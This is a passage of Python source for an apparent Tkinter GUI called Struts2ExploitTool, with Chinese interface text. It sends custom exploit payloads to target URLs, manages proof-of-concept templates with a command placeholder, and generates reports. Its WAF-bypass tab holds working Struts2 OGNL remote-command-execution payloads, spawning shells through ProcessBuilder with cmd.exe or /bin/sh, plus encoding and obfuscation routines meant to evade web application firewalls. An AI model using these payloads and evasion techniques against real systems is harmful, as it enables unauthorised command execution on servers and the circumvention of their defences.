                             f"\n===== 利用结束于 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} =====")

    def execute_custom_exploit(self):
        """执行自定义漏洞利用"""
        url = self.custom_target_url.get().strip()
        vuln_name = self.custom_vuln_name.get().strip()
        payload = self.custom_payload.get(1.0, tk.END).strip()
        method = self.request_method.get()
        data = self.request_data.get(1.0, tk.END).strip()

        if not url or not payload:
            messagebox.showerror("错误", "请填写目标URL和Payload")
            return

        # 清空之前的结果
        self.custom_exploit_result.config(state=tk.NORMAL)
        self.custom_exploit_result.delete(1.0, tk.END)
        self.custom_exploit_result.config(state=tk.DISABLED)

        # 记录开始信息
        self.log_exploit(self.custom_exploit_result, f"===== 开始自定义漏洞利用 =====")
        self.log_exploit(self.custom_exploit_result, f"漏洞名称: {vuln_name}")
        self.log_exploit(self.custom_exploit_result, f"目标URL: {url}")
        self.log_exploit(self.custom_exploit_result, f"请求方法: {method}")
        self.log_exploit(self.custom_exploit_result,
                         f"开始时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        # 启动利用线程
        threading.Thread(
            target=self.perform_custom_exploit,
            args=(url, vuln_name, payload, method, data),
            daemon=True
        ).start()

    def perform_custom_exploit(self, url, vuln_name, payload, method, data):
        """执行具体的自定义漏洞利用"""
        try:
            # 发送请求
            self.log_exploit(self.custom_exploit_result, "发送请求...")
            response = http_request(url, payload, method=method, data=data)

            # 显示结果
            self.log_exploit(self.custom_exploit_result, "\n响应状态码: " + str(response.status_code))
            self.log_exploit(self.custom_exploit_result, "\n响应头:")
            self.log_exploit(self.custom_exploit_result, str(response.headers))
            self.log_exploit(self.custom_exploit_result, "\n响应内容:")
            self.log_exploit(self.custom_exploit_result,
                             response.text[:5000] + ("..." if len(response.text) > 5000 else ""))

            # 记录利用记录
            self.exploit_records.append({
                "url": url,
                "vuln_type": vuln_name,
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "success": response.status_code in [200, 201, 204]
            })

        except Exception as e:
            self.log_exploit(self.custom_exploit_result, f"利用过程出错: {str(e)}")
        finally:
            self.log_exploit(self.custom_exploit_result,
                             f"\n===== 利用结束于 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} =====")

    # 3. POC管理页面
    def init_poc_manager_tab(self):
        """初始化POC管理页面"""
        # 左侧POC列表
        left_frame = ttk.Frame(self.tab_poc_manager, width=300)
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
        left_frame.pack_propagate(False)

        # 漏洞类型选择
        vuln_frame = ttk.LabelFrame(left_frame, text="漏洞类型")
        vuln_frame.pack(fill=tk.X, padx=5, pady=5)

        self.poc_vuln_var = tk.StringVar(value=self.vulnerability_types[2])  # 跳过"全部选择"和分类
        self.poc_vuln_combo = ttk.Combobox(
            vuln_frame,
            textvariable=self.poc_vuln_var,
            values=[v for v in self.vulnerability_types if v not in ["全部选择", "Struts2漏洞"]],
            state="readonly"
        )
        self.poc_vuln_combo.pack(fill=tk.X, padx=5, pady=5)
        self.poc_vuln_combo.bind("<<ComboboxSelected>>", self.refresh_poc_list)

        # POC列表
        list_frame = ttk.LabelFrame(left_frame, text="POC列表")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.poc_listbox = tk.Listbox(list_frame)
        self.poc_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)

        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.poc_listbox.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.poc_listbox.config(yscrollcommand=scrollbar.set)
        self.poc_listbox.bind("<<ListboxSelect>>", self.on_poc_selected)

        # 操作按钮
        btn_frame = ttk.Frame(left_frame)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(btn_frame, text="新建POC", command=self.create_new_poc).pack(fill=tk.X, padx=2, pady=2)
        ttk.Button(btn_frame, text="删除POC", command=self.delete_selected_poc).pack(fill=tk.X, padx=2, pady=2)
        ttk.Button(btn_frame, text="导入POC", command=self.import_poc_file).pack(fill=tk.X, padx=2, pady=2)
        ttk.Button(btn_frame, text="导出POC", command=self.export_poc_file).pack(fill=tk.X, padx=2, pady=2)

        # 右侧POC编辑区
        right_frame = ttk.Frame(self.tab_poc_manager)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)

        # POC名称
        name_frame = ttk.Frame(right_frame)
        name_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(name_frame, text="POC名称:").pack(side=tk.LEFT, padx=5, pady=5)
        self.poc_name_entry = ttk.Entry(name_frame)
        self.poc_name_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, pady=5)

        # POC描述
        desc_frame = ttk.LabelFrame(right_frame, text="POC描述")
        desc_frame.pack(fill=tk.X, padx=5, pady=5)

        self.poc_desc_text = scrolledtext.ScrolledText(desc_frame, height=3, wrap=tk.WORD)
        self.poc_desc_text.pack(fill=tk.X, padx=5, pady=5)

        # POC内容
        content_frame = ttk.LabelFrame(right_frame, text="POC内容")
        content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        ttk.Label(content_frame, text="请在POC中使用{{COMMAND}}作为命令占位符:").pack(anchor=tk.W, padx=5, pady=2)
        self.poc_content_text = scrolledtext.ScrolledText(content_frame, wrap=tk.WORD)
        self.poc_content_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 保存按钮
        ttk.Button(right_frame, text="保存POC", command=self.save_current_poc).pack(side=tk.RIGHT, padx=5, pady=5)

        # 初始刷新POC列表
        self.refresh_poc_list()

    def refresh_poc_list(self, event=None):
        """刷新POC列表"""
        vuln_type = self.poc_vuln_var.get()
        self.poc_listbox.delete(0, tk.END)

        if vuln_type in self.poc_database:
            for poc in self.poc_database[vuln_type]:
                self.poc_listbox.insert(tk.END, poc["name"])

    def on_poc_selected(self, event=None):
        """选择POC时加载内容"""
        selection = self.poc_listbox.curselection()
        if not selection:
            return

        index = selection[0]
        vuln_type = self.poc_vuln_var.get()

        if vuln_type in self.poc_database and index < len(self.poc_database[vuln_type]):
            poc = self.poc_database[vuln_type][index]
            self.poc_name_entry.delete(0, tk.END)
            self.poc_name_entry.insert(0, poc["name"])
            self.poc_desc_text.delete(1.0, tk.END)
            self.poc_desc_text.insert(1.0, poc.get("description", ""))
            self.poc_content_text.delete(1.0, tk.END)
            self.poc_content_text.insert(1.0, poc["content"])

    def create_new_poc(self):
        """创建新POC"""
        vuln_type = self.poc_vuln_var.get()
        default_name = f"{vuln_type}_poc_{len(self.poc_database.get(vuln_type, [])) + 1}"

        self.poc_name_entry.delete(0, tk.END)
        self.poc_name_entry.insert(0, default_name)
        self.poc_desc_text.delete(1.0, tk.END)
        self.poc_content_text.delete(1.0, tk.END)
        self.poc_listbox.selection_clear(0, tk.END)

    def delete_selected_poc(self):
        """删除选中的POC"""
        selection = self.poc_listbox.curselection()
        if not selection:
            messagebox.showinfo("提示", "请先选择要删除的POC")
            return

        index = selection[0]
        vuln_type = self.poc_vuln_var.get()

        if vuln_type in self.poc_database and index < len(self.poc_database[vuln_type]):
            poc_name = self.poc_database[vuln_type][index]["name"]
            if messagebox.askyesno("确认", f"确定要删除POC '{poc_name}' 吗?"):
                del self.poc_database[vuln_type][index]
                self.save_poc_database()
                self.refresh_poc_list()
                self.create_new_poc()  # 清空编辑区

    def import_poc_file(self):
        """导入POC文件"""
        file_path = filedialog.askopenfilename(
            filetypes=[("POC文件", "*.poc;*.txt;*.json"), ("所有文件", "*.*")],
            title="选择POC文件"
        )
        if not file_path:
            return

        try:
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()

            vuln_type = self.poc_vuln_var.get()
            poc_name = os.path.splitext(os.path.basename(file_path))[0]

            # 检查是否已存在同名POC
            if vuln_type in self.poc_database:
                for i, poc in enumerate(self.poc_database[vuln_type]):
                    if poc["name"] == poc_name:
                        if not messagebox.askyesno("确认", f"POC '{poc_name}' 已存在，是否覆盖?"):
                            return
                        del self.poc_database[vuln_type][i]
                        break

            # 添加新POC
            if vuln_type not in self.poc_database:
                self.poc_database[vuln_type] = []

            self.poc_database[vuln_type].append({
                "name": poc_name,
                "description": f"从文件导入: {file_path}",
                "content": content
            })

            self.save_poc_database()
            self.refresh_poc_list()
            messagebox.showinfo("成功", f"POC '{poc_name}' 已导入")
        except Exception as e:
            messagebox.showerror("错误", f"导入POC失败: {str(e)}")

    def export_poc_file(self):
        """导出POC文件"""
        selection = self.poc_listbox.curselection()
        if not selection:
            messagebox.showinfo("提示", "请先选择要导出的POC")
            return

        index = selection[0]
        vuln_type = self.poc_vuln_var.get()

        if vuln_type in self.poc_database and index < len(self.poc_database[vuln_type]):
            poc = self.poc_database[vuln_type][index]
            file_path = filedialog.asksaveasfilename(
                defaultextension=".poc",
                filetypes=[("POC文件", "*.poc"), ("文本文件", "*.txt"), ("所有文件", "*.*")],
                initialfile=poc["name"]
            )

            if file_path:
                try:
                    with open(file_path, "w", encoding="utf-8") as f:
                        f.write(poc["content"])
                    messagebox.showinfo("成功", f"POC已导出到 {file_path}")
                except Exception as e:
                    messagebox.showerror("错误", f"导出POC失败: {str(e)}")

    def save_current_poc(self):
        """保存当前编辑的POC"""
        poc_name = self.poc_name_entry.get().strip()
        poc_desc = self.poc_desc_text.get(1.0, tk.END).strip()
        poc_content = self.poc_content_text.get(1.0, tk.END).strip()
        vuln_type = self.poc_vuln_var.get()

        if not poc_name or not poc_content:
            messagebox.showerror("错误", "POC名称和内容不能为空")
            return

        # 检查是否是更新现有POC
        selection = self.poc_listbox.curselection()
        updated = False

        if selection:
            index = selection[0]
            if vuln_type in self.poc_database and index < len(self.poc_database[vuln_type]):
                self.poc_database[vuln_type][index] = {
                    "name": poc_name,
                    "description": poc_desc,
                    "content": poc_content
                }
                updated = True

        # 如果不是更新，则添加新POC
        if not updated:
            # 检查是否已存在同名POC
            if vuln_type in self.poc_database:
                for i, poc in enumerate(self.poc_database[vuln_type]):
                    if poc["name"] == poc_name:
                        if not messagebox.askyesno("确认", f"POC '{poc_name}' 已存在，是否覆盖?"):
                            return
                        del self.poc_database[vuln_type][i]
                        break

            if vuln_type not in self.poc_database:
                self.poc_database[vuln_type] = []

            self.poc_database[vuln_type].append({
                "name": poc_name,
                "description": poc_desc,
                "content": poc_content
            })

        # 保存并刷新
        self.save_poc_database()
        self.refresh_poc_list()
        messagebox.showinfo("成功", f"POC '{poc_name}' 已{'更新' if updated else '保存'}")

    # 4. WAF绕过页面
    def init_waf_bypass_tab(self):
        """初始化WAF绕过页面"""
        # 绕过方法选择
        methods_frame = ttk.LabelFrame(self.tab_waf_bypass, text="WAF绕过方法")
        methods_frame.pack(fill=tk.X, padx=10, pady=5)

        self.waf_methods = {
            "编码绕过": ["URL编码", "Base64编码", "Unicode编码", "HTML实体编码", "十六进制编码"],
            "字符混淆": ["大小写混淆", "特殊字符插入", "关键字拆分", "空字符填充", "注释绕过"],
            "请求变形": ["参数污染", "分块传输", "HTTP方法混淆", "协议版本伪造", "多参数拆分"],
            "头部伪造": ["User-Agent伪造", "Referer伪造", "Cookie注入", "X-Forwarded-For伪造", "自定义头部"]
        }

        self.waf_check_vars = {}
        self.waf_notebook = ttk.Notebook(methods_frame)
        self.waf_notebook.pack(fill=tk.X, padx=5, pady=5)

        for category, methods in self.waf_methods.items():
            frame = ttk.Frame(self.waf_notebook)
            self.waf_notebook.add(frame, text=category)

            for i, method in enumerate(methods):
                var = tk.BooleanVar(value=False)
                self.waf_check_vars[method] = var
                ttk.Checkbutton(frame, text=method, variable=var).grid(
                    row=i // 2, column=i % 2, padx=10, pady=3, sticky=tk.W
                )

        # 绕过选项设置
        options_frame = ttk.LabelFrame(self.tab_waf_bypass, text="绕过选项设置")
        options_frame.pack(fill=tk.X, padx=10, pady=5)

        # 编码次数
        ttk.Label(options_frame, text="编码次数:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.encode_count = ttk.Combobox(options_frame, values=[str(i) for i in range(1, 6)], width=5)
        self.encode_count.current(0)
        self.encode_count.grid(row=0, column=1, padx=5, pady=5)

        # 特殊字符
        ttk.Label(options_frame, text="特殊分隔符:").grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
        self.delimiters = ttk.Entry(options_frame, width=30)
        self.delimiters.grid(row=0, column=3, padx=5, pady=5)
        self.delimiters.insert(0, "/,.,;,+,_,|,(,),[,]")

        # 混淆比例
        ttk.Label(options_frame, text="混淆比例:").grid(row=0, column=4, padx=5, pady=5, sticky=tk.W)
        self.obfuscation_ratio = ttk.Combobox(options_frame, values=["低", "中", "高"], width=5)
        self.obfuscation_ratio.current(1)
        self.obfuscation_ratio.grid(row=0, column=5, padx=5, pady=5)

        # Payload处理区域
        payload_frame = ttk.LabelFrame(self.tab_waf_bypass, text="Payload处理")
        payload_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # 原始Payload
        ttk.Label(payload_frame, text="原始Payload:").pack(anchor=tk.W, padx=5, pady=2)
        self.raw_payload = scrolledtext.ScrolledText(payload_frame, height=5, wrap=tk.WORD)
        self.raw_payload.pack(fill=tk.X, padx=5, pady=2)
        self.raw_payload.insert(tk.END,
                                "%{#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,#m=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\"),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"whoami\").getInputStream())}")

        # 处理按钮
        btn_frame = ttk.Frame(payload_frame)
        btn_frame.pack(fill=tk.X, pady=5)

        ttk.Button(btn_frame, text="生成绕过Payload", command=self.generate_bypass_payload).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="随机生成Payload", command=self.generate_random_payload).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="复制结果", command=lambda: self.copy_to_clipboard(self.processed_payload)).pack(
            side=tk.RIGHT, padx=5)

        # 处理后的Payload
        ttk.Label(payload_frame, text="处理后的Payload:").pack(anchor=tk.W, padx=5, pady=2)
        self.processed_payload = scrolledtext.ScrolledText(payload_frame, wrap=tk.WORD)
        self.processed_payload.pack(fill=tk.BOTH, expand=True, padx=5, pady=2)

    def apply_bypass_techniques(self, payload, methods):
        """应用WAF绕过技术处理payload"""
        result = payload

        # URL编码
        if "URL编码" in methods:
            encode_count = int(self.encode_count.get())
            for _ in range(encode_count):
                result = urllib.parse.quote(result)

        # Base64编码
        if "Base64编码" in methods:
            result = base64.b64encode(result.encode()).decode()

        # Unicode编码
        if "Unicode编码" in methods:
            encoded = []
            for c in result:
                if c.isalpha():
                    encoded.append(f"\\u{ord(c):04x}")
                else:
                    encoded.append(c)
            result = ''.join(encoded)

        # 大小写混淆
        if "大小写混淆" in methods:
            ratio = self.obfuscation_ratio.get()
            change_rate = 0.3 if ratio == "低" else 0.5 if ratio == "中" else 0.7

            result = list(result)
            for i in range(len(result)):
                if result[i].isalpha() and random.random() < change_rate:
                    result[i] = result[i].upper() if result[i].islower() else result[i].lower()
            result = ''.join(result)

        # 特殊字符插入
        if "特殊字符插入" in methods and self.delimiters.get():
            delimiters = [d.strip() for d in self.delimiters.get().split(',') if d.strip()]
            if delimiters:
                keywords = ["exec", "cmd", "shell", "system", "runtime", "file", "read", "write"]
                for keyword in keywords:
                    if keyword in result:
                        # 在关键字中插入随机分隔符
                        new_keyword = []
                        for i, c in enumerate(keyword):
                            new_keyword.append(c)
                            if i < len(keyword) - 1 and random.random() < 0.5:
                                new_keyword.append(random.choice(delimiters))
                        result = result.replace(keyword, ''.join(new_keyword))

        return result

    def generate_bypass_payload(self):
        """生成绕过WAF的Payload"""
        raw_payload = self.raw_payload.get(1.0, tk.END).strip()
        if not raw_payload:
            messagebox.showerror("错误", "请输入原始Payload")
            return

        # 获取选中的绕过方法
        selected_methods = [method for method, var in self.waf_check_vars.items() if var.get()]
        if not selected_methods:
            self.processed_payload.delete(1.0, tk.END)
            self.processed_payload.insert(1.0, raw_payload)
            return

        # 应用绕过技术
        processed = self.apply_bypass_techniques(raw_payload, selected_methods)

        # 显示结果
        self.processed_payload.delete(1.0, tk.END)
        self.processed_payload.insert(1.0, processed)

        # 显示使用的方法
        self.processed_payload.insert(tk.END, "\n\n使用的绕过方法: " + ", ".join(selected_methods))

    def generate_random_payload(self):
        """随机生成一个绕过Payload"""
        # 常用的命令执行Payload模板
        templates = [
            "%{#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,#m=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\"),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"{{COMMAND}}\").getInputStream())}",
            "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{{COMMAND}}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().indexOf('win')>=0)).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))).(#ros)}",
            "${@java.lang.Runtime@getRuntime().exec(\"{{COMMAND}}\")}"
        ]

        # 随机选择一个模板
        template = random.choice(templates)

        # 随机选择一些绕过方法
        all_methods = [method for method in self.waf_check_vars.keys()]
        selected_count = random.randint(1, 3)
        selected_methods = random.sample(all_methods, selected_count)

        # 应用绕过技术
        processed = self.apply_bypass_techniques(template, selected_methods)

        # 显示结果
        self.raw_payload.delete(1.0, tk.END)
        self.raw_payload.insert(1.0, template)

        self.processed_payload.delete(1.0, tk.END)
        self.processed_payload.insert(1.0, processed)
        self.processed_payload.insert(tk.END, "\n\n使用的绕过方法: " + ", ".join(selected_methods))

    def copy_to_clipboard(self, text_widget):
        """复制文本到剪贴板"""
        text = text_widget.get(1.0, tk.END).strip()
        if text:
            self.root.clipboard_clear()
            self.root.clipboard_append(text)
            messagebox.showinfo("成功", "已复制到剪贴板")

    # 5. 报告生成页面（独立页面）
    def init_report_tab(self):
        """初始化报告生成页面"""
        # 报告设置区域
        settings_frame = ttk.LabelFrame(self.tab_report, text="报告设置")
        settings_frame.pack(fill=tk.X, padx=10, pady=5)

        # 报告名称
        ttk.Label(settings_frame, text="报告名称:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.report_name = ttk.Entry(settings_frame)
        self.report_name.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        default_name = f"漏洞报告_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.report_name.insert(0, default_name)
        settings_frame.columnconfigure(1, weight=1)

        # 报告格式
        ttk.Label(settings_frame, text="报告格式:").grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
        self.report_format = ttk.Combobox(settings_frame, values=["HTML", "PDF", "TXT", "JSON"], state="readonly",
                                          width=10)
        self.report_format.current(0)
        self.report_format.grid(row=0, column=3, padx=5, pady=5)

        # 保存路径
        ttk.Label(settings_frame, text="保存路径:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.report_path = ttk.Entry(settings_frame)
        self.report_path.grid(row=1, column=1, padx=5, pady=5, sticky=tk.EW)
        self.report_path.insert(0, os.path.join(os.getcwd(), "reports"))

        ttk.Button(settings_frame, text="浏览...", command=self.choose_report_path).grid(row=1, column=2, padx=5,
                                                                                         pady=5)

        # 报告内容选择
        content_frame = ttk.LabelFrame(self.tab_report, text="报告内容")
        content_frame.pack(fill=tk.X, padx=10, pady=5)

        self.include_scan_info = tk.BooleanVar(value=True)
        ttk.Checkbutton(content_frame, text="包含扫描结果", variable=self.include_scan_info).pack(anchor=tk.W, padx=10,
                                                                                                  pady=2)

        self.include_exploit_info = tk.BooleanVar(value=True)
        ttk.Checkbutton(content_frame, text="包含利用记录", variable=self.include_exploit_info).pack(anchor=tk.W,
                                                                                                     padx=10, pady=2)

        self.include_vuln_details = tk.BooleanVar(value=True)
        ttk.Checkbutton(content_frame, text="包含漏洞详情", variable=self.include_vuln_details).pack(anchor=tk.W,
                                                                                                     padx=10, pady=2)

        self.include_fix_suggestions = tk.BooleanVar(value=True)
        ttk.Checkbutton(content_frame, text="包含修复建议", variable=self.include_fix_suggestions).pack(anchor=tk.W,
                                                                                                        padx=10, pady=2)

        # 生成按钮
        btn_frame = ttk.Frame(self.tab_report)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Button(btn_frame, text="生成报告", command=self.generate_vulnerability_report).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="预览报告", command=self.preview_report).pack(side=tk.LEFT, padx=5)

        # 报告预览区域
        preview_frame = ttk.LabelFrame(self.tab_report, text="报告预览")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.report_preview = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD)
        self.report_preview.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.report_preview.config(state=tk.DISABLED)

        # 报告状态
        self.report_status = ttk.Label(self.tab_report, text="")
        self.report_status.pack(anchor=tk.W, padx=10, pady=5)

    def choose_report_path(self):
        """选择报告保存路径"""
        path = filedialog.askdirectory(title="选择报告保存路径")
        if path:
            self.report_path.delete(0, tk.END)
            self.report_path.insert(0, path)

    def generate_vulnerability_report(self):
        """生成漏洞报告"""
        if not self.scan_results and not self.exploit_records:
            messagebox.showwarning("警告", "没有扫描结果或利用记录可生成报告")
            return

        # 准备报告信息
        report_name = self.report_name.get().strip()
        report_path = self.report_path.get().strip()
        report_format = self.report_format.get()

        if not report_name:
            messagebox.showerror("错误", "请输入报告名称")
            return

        # 确保保存目录存在
        if not os.path.exists(report_path):
            try:
                os.makedirs(report_path)
            except Exception as e:
                messagebox.showerror("错误", f"无法创建目录: {str(e)}")
                return

        # 构建报告内容
        report_data = self.build_report_data()

        # 保存报告
        try:
            # 构建完整路径
            file_ext = report_format.lower()
            file_name = f"{report_name}.{file_ext}"
            full_path = os.path.join(report_path, file_name)

            # 根据格式保存
            if report_format == "JSON":
                with open(full_path, "w", encoding="utf-8") as f:
                    json.dump(report_data, f, ensure_ascii=False, indent=2)
            elif report_format == "HTML":
                self.save_html_report(full_path, report_data)
            elif report_format == "PDF":
                # PDF报告生成较为复杂，这里简化处理
                self.save_text_report(full_path, report_data)
                messagebox.showinfo("提示", "PDF报告功能暂未实现，已生成TXT格式报告")
            else:  # TXT
                self.save_text_report(full_path, report_data)

            # 更新状态和预览
            self.report_status.config(text=f"报告已生成: {full_path}")
            self.preview_report()
            messagebox.showinfo("成功", f"报告已生成: {full_path}")

        except Exception as e:
            messagebox.showerror("错误", f"生成报告失败: {str(e)}")

    def build_report_data(self):
        """构建报告数据"""
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        report_data = {
            "report_name": self.report_name.get().strip(),
            "generated_time": current_time,
            "summary": {
                "total_targets": len(set([res["url"] for res in self.scan_results])),
                "total_vulnerabilities": len([res for res in self.scan_results if res["status"] == "存在"]),
                "total_exploits": len(self.exploit_records),
                "successful_exploits": len([e for e in self.exploit_records if e["success"]])
            }
        }

        # 添加扫描结果
        if self.include_scan_info.get() and self.scan_results:
            report_data["scan_results"] = self.scan_results

        # 添加利用记录
        if self.include_exploit_info.get() and self.exploit_records:
            report_data["exploit_records"] = self.exploit_records

        # 添加漏洞详情
        if self.include_vuln_details.get():
            report_data["vulnerability_details"] = self.get_vulnerability_details()

        # 添加修复建议
        if self.include_fix_suggestions.get():
            report_data["fix_suggestions"] = self.get_fix_suggestions()

        return report_data

    def get_vulnerability_details(self):
        """获取漏洞详情"""
        details = {
            "远程代码执行(RCE)": {
                "description": "远程代码执行漏洞允许攻击者在目标系统上执行任意命令，可能导致完全控制系统。",
                "risk_level": "严重",
                "affected_systems": len([res for res in self.scan_results if
                                         res["vuln_type"] == "远程代码执行(RCE)" and res["status"] == "存在"])
            },
            "反序列化": {
                "description": "反序列化漏洞发生在应用程序对不可信数据进行反序列化时，可能导致远程代码执行。",
                "risk_level": "严重",
                "affected_systems": len(
                    [res for res in self.scan_results if res["vuln_type"] == "反序列化" and res["status"] == "存在"])
            },
            # 其他漏洞类型的详情...
        }

        # 添加Struts2漏洞详情
        struts_vulns = ["S2-001", "S2-003", "S2-005", "S2-007", "S2-008", "S2-009", "S2-012", "S2-013", "S2-015",
                        "S2-016"]
        for vuln in struts_vulns:
            details[vuln] = {
                "description": f"Struts2 {vuln} 漏洞是Struts2框架中的远程代码执行漏洞，可通过特制的请求执行任意命令。",
                "risk_level": "严重",
                "affected_systems": len(
                    [res for res in self.scan_results if res["vuln_type"] == vuln and res["status"] == "存在"])
            }

        return details

    def get_fix_suggestions(self):
        """获取修复建议"""
        return {
            "general": [
                "及时更新所有软件和框架到最新安全版本",
                "实施最小权限原则，限制应用程序权限",
                "部署Web应用防火墙(WAF)进行防护",
                "定期进行安全审计和漏洞扫描",
                "对用户输入进行严格验证和过滤"
            ],
            "struts2": [
                "升级到最新的Struts2版本",
                "应用官方发布的安全补丁",
                "使用Struts2的安全配置选项",
                "考虑使用安全框架替代Struts2"
            ],
            "rce": [
                "避免在代码中使用危险的函数（如exec、eval等）",
                "对命令执行功能进行严格的访问控制",
                "使用白名单限制可执行的命令"
            ]
        }

    def save_text_report(self, file_path, report_data):
        """保存文本格式报告"""
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(f"漏洞扫描报告: {report_data['report_name']}\n")
            f.write(f"生成时间: {report_data['generated_time']}\n\n")

            # 摘要信息
            f.write("=== 摘要信息 ===\n")
            summary = report_data["summary"]
            f.write(f"目标总数: {summary['total_targets']}\n")
            f.write(f"发现漏洞总数: {summary['total_vulnerabilities']}\n")
            f.write(f"执行利用次数: {summary['total_exploits']}\n")
            f.write(f"成功利用次数: {summary['successful_exploits']}\n\n")

            # 其他内容根据配置添加...

    def save_html_report(self, file_path, report_data):
        """保存HTML格式报告"""
        with open(file_path, "w", encoding="utf-8") as f:
            f.write("<!DOCTYPE html>\n<html>\n<head>\n")
            f.write(f"<title>{report_data['report_name']}</title>\n")
            f.write("<meta charset='utf-8'>\n")
            f.write("<style>\n")
            f.write("body {font-family: SimHei, Arial, sans-serif; margin: 20px; line-height: 1.6;}\n")
            f.write("h1, h2, h3 {color: #2c3e50; border-bottom: 1px solid #eee; padding-bottom: 5px;}\n")
            f.write(".summary {background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0;}\n")
            f.write("table {width: 100%; border-collapse: collapse; margin: 10px 0;}\n")
            f.write("th, td {border: 1px solid #ddd; padding: 8px 12px; text-align: left;}\n")
            f.write("th {background-color: #f2f2f2;}\n")
            f.write(".high-risk {color: #e74c3c; font-weight: bold;}\n")
            f.write("</style>\n")
            f.write("</head>\n<body>\n")

            # 报告标题
            f.write(f"<h1>{report_data['report_name']}</h1>\n")
            f.write(f"<p>生成时间: {report_data['generated_time']}</p>\n")

            # 摘要信息
            f.write("<h2>摘要信息</h2>\n")
            f.write("<div class='summary'>\n")
            summary = report_data["summary"]
            f.write(f"<p>目标总数: {summary['total_targets']}</p>\n")
            f.write(f"<p>发现漏洞总数: {summary['total_vulnerabilities']}</p>\n")
            f.write(f"<p>执行利用次数: {summary['total_exploits']}</p>\n")
            f.write(f"<p>成功利用次数: {summary['successful_exploits']}</p>\n")
            f.write("</div>\n")

            # 其他内容根据配置添加...

            f.write("</body>\n</html>")

    def preview_report(self):
        """预览报告"""
        if not self.scan_results and not self.exploit_records:
            messagebox.showwarning("警告", "没有扫描结果或利用记录可预览")
            return

        # 构建报告数据并预览
        report_data = self.build_report_data()

        # 生成预览文本
        preview_text = []
        preview_text.append(f"漏洞扫描报告: {report_data['report_name']}")
        preview_text.append(f"生成时间: {report_data['generated_time']}\n")

        # 摘要信息
        preview_text.append("=== 摘要信息 ===")
        summary = report_data["summary"]
        preview_text.append(f"目标总数: {summary['total_targets']}")
        preview_text.append(f"发现漏洞总数: {summary['total_vulnerabilities']}")
        preview_text.append(f"执行利用次数: {summary['total_exploits']}")
        preview_text.append(f"成功利用次数: {summary['successful_exploits']}\n")

        # 显示在预览区域
        self.report_preview.config(state=tk.NORMAL)
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(1.0, "\n".join(preview_text))
        self.report_preview.config(state=tk.DISABLED)

    # 标签页切换处理
    def on_tab_changed(self, event):
        """标签页切换时的处理"""
        current_tab = self.main_notebook.select()

        # 如果切换到漏洞利用页，尝试从扫描结果中获取URL
        if current_tab == str(self.tab_exploiter):
            selected_items = self.scan_result_tree.selection()
            if selected_items:
                url = self.scan_result_tree.item(selected_items[0], "values")[0]
                # 更新所有利用页面的URL
                for exp_type in ["远程代码执行(RCE)", "反序列化", "路径穿越",
                                 "文件包含", "命令注入", "WEBLogic", "Jboss-后台部署war", "Struts2漏洞"]:
                    url_entry = getattr(self, f"{exp_type}_url", None)
                    if url_entry:
                        url_entry.delete(0, tk.END)
                        url_entry.insert(0, url)

                # 更新自定义利用页面的URL
                self.custom_target_url.delete(0, tk.END)
                self.custom_target_url.insert(0, url)


if __name__ == "__main__":
    root = tk.Tk()
    app = Struts2ExploitTool(root)
    root.mainloop()
